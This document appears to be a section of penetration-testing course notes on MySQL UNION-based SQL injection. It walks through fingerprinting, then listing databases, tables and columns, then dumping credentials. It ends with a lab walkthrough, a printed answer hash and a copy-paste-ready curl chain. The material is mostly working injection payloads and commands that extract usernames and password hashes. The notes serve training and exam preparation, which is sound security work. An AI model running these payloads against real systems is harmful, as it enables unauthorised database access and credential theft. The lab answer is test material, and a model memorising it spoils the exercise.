# Section 13 — Database Enumeration

---

## MySQL Fingerprinting

Confirm you are dealing with MySQL before running MySQL-specific queries:

| Payload | Expected output | Notes |
|---------|----------------|-------|
| `@@version` | `10.3.22-MariaDB-1ubuntu1` | Full output available |
| `POW(1,1)` | `1` | Numeric output only |
| `SLEEP(5)` | 5-second delay | Blind/no output |

```sql
cn' UNION select 1,@@version,3,4-- -
```
> Retrieves the database version string. If you see it in the response, UNION injection is working and the database is MySQL or MariaDB.

> IIS (Microsoft's web server) + an error usually means MSSQL. Apache or Nginx on Linux usually means MySQL or MariaDB.

---

## Enumeration Flow

```
1. List all databases     → INFORMATION_SCHEMA.SCHEMATA
2. List tables in a DB    → INFORMATION_SCHEMA.TABLES
3. List columns in a table → INFORMATION_SCHEMA.COLUMNS
4. Dump target data       → target_db.target_table
```

---

## 1 — List Databases

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
> Lists all databases on the server. Ignore the built-in ones: `mysql`, `information_schema`, `performance_schema`, and `sys`. Everything else is application data worth investigating.

---

## 2 — List Tables in a Database

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
> Lists all tables in the `dev` database. Replace `dev` with the database name you found in step 1. `TABLE_NAME` goes in a visible column so it appears in the response.

- `TABLE_NAME` — table name
- `TABLE_SCHEMA` — which database it belongs to
- `WHERE table_schema='dev'` — filter to one DB to avoid noise

---

## 3 — List Columns in a Table

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
> Lists all columns in the `credentials` table. Replace `credentials` with the table name you found in step 2. The column names in the response tell you what data you can dump in step 4.

- `COLUMN_NAME` — column name
- Filter by `table_name` to target a specific table

---

## 4 — Dump Data

Use dot notation (`db.table`) when querying a database other than the current one:

```sql
cn' UNION select 1,username,password,4 from dev.credentials-- -

-- Target specific rows:
cn' UNION select 1,password,3,4 from ilfreight.users where username='newuser'-- -
```
> Dumps data from a specific table using dot notation (`db.table`). Use this when the target data is in a different database than the current one. Replace `dev.credentials` and column names with values from step 3. Add a `WHERE` clause to target a specific row.

---

## Lab — Get newuser's Password Hash

**Target:** `http://TARGET_IP:TARGET_PORT/search.php?port_code=`  
**Objective:** Find the password hash for `newuser` in `ilfreight.users`.

**Reasoning:**
- Column layout already known from Section 12: 4 columns, column 2 is visible
- Target is in database `ilfreight`, table `users` — use dot notation since the app's current DB may differ
- Filter with `WHERE username='newuser'` to return only that row
- `password` goes in column 2 (visible)

```bash
curl -s "http://TARGET_IP:TARGET_PORT/search.php?port_code=cn%27+UNION+select+1,password,3,4+from+ilfreight.users+where+username=%27newuser%27--+-"
```
> Retrieves the password hash for `newuser` via UNION injection. URL-encoded: `%27` = `'`, `+` = space, `%27` around the username value. Replace `TARGET_IP`, `TARGET_PORT`, and the username value with your target's values.

**Result:**
```
Port Code                          | Port City | Port Volume
9da2c9bcdf39d8610954e0e11ea8f45f  | 3         | 4
```

**Q1 Answer:** `9da2c9bcdf39d8610954e0e11ea8f45f`

---

## Full Recon Chain (copy-paste ready)

```bash
TARGET="http://TARGET_IP:PORT/search.php?port_code="

# Fingerprint
curl -s "${TARGET}cn%27+UNION+select+1,@@version,3,4--+-"

# List DBs
curl -s "${TARGET}cn%27+UNION+select+1,schema_name,3,4+from+INFORMATION_SCHEMA.SCHEMATA--+-"

# List tables in target DB
curl -s "${TARGET}cn%27+UNION+select+1,TABLE_NAME,TABLE_SCHEMA,4+from+INFORMATION_SCHEMA.TABLES+where+table_schema=%27TARGET_DB%27--+-"

# List columns in target table
curl -s "${TARGET}cn%27+UNION+select+1,COLUMN_NAME,TABLE_NAME,4+from+INFORMATION_SCHEMA.COLUMNS+where+table_name=%27TARGET_TABLE%27--+-"

# Dump data
curl -s "${TARGET}cn%27+UNION+select+1,username,password,4+from+TARGET_DB.TARGET_TABLE--+-"
```
> Full four-step UNION enumeration chain. Set `TARGET` to your base URL once. Replace `TARGET_DB` and `TARGET_TABLE` in each step with the values returned by the previous step. Run each command in sequence: fingerprint → databases → tables → columns → data dump.

---

## Exam Notes

- `INFORMATION_SCHEMA` is read-only metadata — always accessible, never modified by the app
- Dot notation (`db.table`) is required when querying outside the current database
- `WHERE table_schema=` and `WHERE table_name=` filters are essential — without them you get the entire server's schema
- Seeing `root@localhost` from `user()` means FILE privilege is likely available → file read/write (Sections 15-16)
- Always check for non-default databases first — they contain the actual application data
